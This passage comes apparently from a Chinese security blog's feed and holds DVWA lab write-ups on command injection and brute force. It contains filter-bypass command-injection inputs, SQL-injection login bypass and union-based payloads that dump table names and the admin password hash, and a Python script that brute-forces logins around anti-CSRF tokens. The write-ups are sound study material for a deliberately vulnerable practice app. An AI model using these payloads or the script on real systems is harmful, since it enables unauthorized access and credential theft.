class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=$_REQUEST[&apos;ip&apos;];</span><br><span class="line">$substitutions=array(</span><br><span class="line">&apos;&amp;&amp;&apos;=&gt;&apos;&apos;,</span><br><span class="line">&apos;;&apos;=&gt;&apos;&apos;</span><br><span class="line">);</span><br><span class="line">$target=str_replace(array_keys($substitutions),$substitutions,$target);</span><br><span class="line">if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我们还是先来了解几个函数：</p><p>(1)array_keys(array,value,strict)：返回包含数组中所有键名的新数组，参数array为所选数组，value为指定键值，若输入则返回键值对应的键名，strict指定依赖类型</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$substitutions=<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'&amp;&amp;'</span>=&gt;<span class="string">''</span>,</span><br><span class="line"><span class="string">';'</span>=&gt;<span class="string">''</span></span><br><span class="line">);</span><br><span class="line">print_r(array_keys($substitutions));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)str_replace(find,replace,string,count)：以其他字符替换所选字符串中的指定字符，参数find为查找的字符，replace为替换的字符，string为所选的字符串，count为计算替换数的变量</p><p>了解了这两个函数，我们就可以这关对’&amp;&amp;’和’;’这两个字符进行了过滤，但是str_replace函数是非常不安全的，因为它只进行了一次的替换，最普遍的绕过方法就是双写绕过，但是这里&amp;&amp;由于都是同样的字符无法双写，但是服务器还对’;’字符进行了过滤，所以我们可以输入</p><p>127.0.0.1 &amp;;&amp; net user，由于只过滤了一次，过滤字符’;’后就剩下了&amp;&amp;，结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>虽然&amp;&amp;被过滤了，但是命令连接符还有&amp;和|可以使用，注意三者的区别即可</p><p>输入127.0.0.1 | net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=trim($_REQUEST[&apos;ip&apos;]);</span><br><span class="line">$substitutions = array( </span><br><span class="line">        &apos;&amp;&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;;&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;| &apos; =&gt; &apos;&apos;, </span><br><span class="line">        &apos;-&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;$&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;(&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;)&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;`&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;||&apos; =&gt; &apos;&apos;, </span><br><span class="line">    ); </span><br><span class="line">    $target=str_replace(array_keys($substitutions),$substitutions,$target);</span><br><span class="line">    if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">    $cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    $cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关过滤的字符较为完全，其中过滤了字符’&amp;’，也就是说连接符&amp;&amp;和&amp;都不能使用了，还过滤了字符’|’和’||’，但仔细看是过滤了’| ‘而不是’|’，(|后面还有一个空格)，也就是说连接符|还可以使用</p><p>输入127.0.0.1|net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以在||中间加一个被过滤的字符，例如；</p><p>但是必须保证ping 命令执行失败才执行||之后的命令</p><p>输入11 |;| net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功绕过过滤</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line"></span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ]; </span><br><span class="line"></span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects </span><br><span class="line"></span><br><span class="line">    $octet = explode( &quot;.&quot;, $target ); </span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer </span><br><span class="line"></span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // If all 4 octets are int&apos;s put the IP back together. </span><br><span class="line"></span><br><span class="line">        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; </span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">            // Windows </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        else &#123; </span><br><span class="line"></span><br><span class="line">            // *nix </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // Ops. Let the user name theres a mistake </span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line"></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先还是先了解几个函数：</p><p>(1)explode(separator,string,limit)：将字符串打散成数组，返回组成的数组，参数separator为分隔符，规定在哪里开始分割字符串，string为要分割的字符串，limit规定所返回的数组元素的数目</p><p>(2)is_numeric(string)：检测string是否为数字或数字字符串，是则返回true，不是则返回false</p><p>(3)sizeof(array,mode)：计算数组中的元素个数</p><p>这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求</p><p>然后将输入的ip值以字符’.’为分隔符打散成一个数组，并检测数组中的每个元素是否为数字并且数组元素个数是否为4，这就限制了我们输入的值必须是一个正确格式的ip地址</p><p>也就是说只有“数字.数字.数字.数字”的输入才会被执行，非常完美的防止了命令注入漏洞</p>]]></content>
    
    <summary type="html">
    
      dvwa-Command Injection
    
    </summary>
    
      <category term="dvwa-Command Injection" scheme="https://Foxgrin.github.io/categories/dvwa-Command-Injection/"/>
    
    
      <category term="Command Injection" scheme="https://Foxgrin.github.io/tags/Command-Injection/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Brute Force</title>
    <link href="https://Foxgrin.github.io//posts/22283/"/>
    <id>https://Foxgrin.github.io//posts/22283/</id>
    <published>2018-07-14T07:50:00.000Z</published>
    <updated>2018-07-14T13:50:44.048Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中暴力破解的一些关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">if($result &amp;&amp; mysql_num_rows($result) == 1)&#123;</span><br><span class="line">$avatar=mysql_result($result,0,&apos;avatar&apos;);</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; </span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的关卡是一个用户登录的界面，用户必须正确输入用户名和密码才能成功登录，我们从源代码来看，服务器只对是否GET了一个Login值进行了检测，存在了明显的sql注入漏洞，攻击者不仅可以通过sql注入获取用户信息，还可以利用暴力破解的方法获取用户密码，这就是Brute Force(暴力破解)</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>(1)利用burpsuite爆破密码</p><p>首先抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为我们要对password参数进行爆破，所以在password参数的内容两边加上$</p><p>然后将包发送到intruder模块，选中Payloads，载入字典，点击爆破</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从爆破结果的响应包长度来看，只有值为password的响应包长度与众不同，猜测正确密码就是password，尝试登陆，成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)sql注入</p><p>首先寻找注入点，这里因为$pass经过md5加密，所以不能当做注入点，注入点就只剩下了$user</p><p>我们可以使用万能密码登录，在username中输入admin’ or ‘1’=’1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录成功</p><p>也可以输入admin’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样登录成功</p><p>如果要获取admin的密码信息，我们可以继续注入</p><p>因为服务器限制了查询结果返回的行数只能为1，所以要获取信息，我们必须能让$user值在数据库中不存在</p><p>任意输入username值为 0‘# 测试不存在该用户名</p><p>因为这里有返回信息，我们可以考虑用较为简单的联合查询注入</p><p>那么首先我们就必须知道查询的列数，输入admin’ order by 9#发现报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以查询列数为8</p><p>接下来就是找获取有效信息的位置，我们输入0’ union select 1,2,3,4,5,6,7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从页面上看是获取不到我们需要的信息，因为图片加载不出来，但是我们可以从源代码看</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>有效信息在6所处的位置，因此我们在6的位置开始注入</p><p>首先爆库</p><p>输入0’ union select 1,2,3,4,5,database(),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接着爆表</p><p>输入0’ union select 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=database()),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再来爆列</p><p>输入0’ union select 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_name=’users’),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后爆数据</p><p>输入0’ union select 1,2,3,4,5,(select password from users where user=’admin’),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是这里获取到的密码经过md5加密，md5又属于单向加密技术，所以这个密码并没有实际的用处</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">if($result &amp;&amp; mysql_num_rows($result) == 1)&#123;</span><br><span class="line">$avatar=mysql_result($result,0,&apos;avatar&apos;);</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; </span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">sleep(2);</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>相对于上一关，这关对$user和$pass进行了mysql_real_escape的转义处理，预防了sql注入</p><p>并且登录失败时会sleep 2秒</p><p>虽然预防了sql注入，但是依然可以利用burp爆破密码，跟上一关一样就不演示了</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken($_REQUEST[&apos;user_token&apos;],$_SESSION[&apos;session_token&apos;],&apos;index.php&apos;);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$user=stripslashes($user);</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=stripslashes($pass);</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">//Checkdatabase</span><br><span class="line">$query=&quot;SELECT*FROM`users`WHEREuser=&apos;$user&apos;ANDpassword=&apos;$pass&apos;;&quot;;</span><br><span class="line">$result=mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);</span><br><span class="line"></span><br><span class="line">if($result&amp;&amp;mysql_num_rows($result)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line">$avatar=mysql_result($result,0,&quot;avatar&quot;);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line">echo&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(rand(0,3));</span><br><span class="line">echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GenerateAnti-CSRFtoken</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>加入了token验证机制，我们每次登录时都必须提交一个token值，服务器将提交的token值与cookie或session中的token值对比，若不同则拦截下来，也就是说用之前burp爆破密码的方法是行不通的</p><p>还利用了mysql_real_escape_string函数对$user和$pass进行了转义处理，防止了sql注入</p><p>这里我们要想登录，就必须获取到token值，这关利用python脚本进行爆破</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/brute/"</span></span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://127.0.0.1/dvwa/vulnerabilities/brute/'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line">file=open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">    line=line.strip()</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    r=s.get(url,headers=header)</span><br><span class="line">    soup=BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line">    user_token=soup.find_all(<span class="string">'input'</span>)[<span class="number">3</span>][<span class="string">'value'</span>]</span><br><span class="line">    payload=&#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">        <span class="string">'password'</span>:line,</span><br><span class="line">        <span class="string">'user_token'</span>:user_token,</span><br><span class="line">        <span class="string">'Login'</span>:<span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line">    html=s.get(url,params=payload,headers=header)</span><br><span class="line">    length=len(html.text)</span><br><span class="line">    print(<span class="string">'user_token:'</span>+user_token+<span class="string">'username:admin password:'</span>+line+<span class="string">' length:'</span>+str(length))</span><br></pre></td></tr></table></figure><p>思路是首先读取文件中一个个猜测的密码，这里只用10个密码进行模拟，然后创建一个会话记录，用于保政访问页面的token值不发生变化，然后利用BeautifulSoup库的find_all方法获取所有input标签组成的列表，带有token值的input标签在列表的第三个元素，然后将value属性的值，也就是token值取出，这就获得了token值，然后再将各个参数通过get形式传递给服务器，最终比较返回页面的长度，正常而言，输入正确和失败返回的页面长度是不同的，所以众多猜测密码中，只有一个密码返回的页面长度是不同的，那个密码就可能是正确的密码</p><p>这里还应当注意，应先用burp抓包获取访问登录页面的请求头，否则脚本每次访问的都是dvwa一开始的登录页面</p><p>脚本执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出password的返回长度跟其他不同，在登录页面输入，登录成功</p>]]></content>
    
    <summary type="html">
    
      dvwa-Brute Force
    
    </summary>
    
      <category term="dvwa-Brute Force" scheme="https://Foxgrin.github.io/categories/dvwa-Brute-Force/"/>
    
    
      <category term="Brute Force" scheme="https://Foxgrin.github.io/tags/Brute-Force/"/>
    
  </entry>
  
</feed>
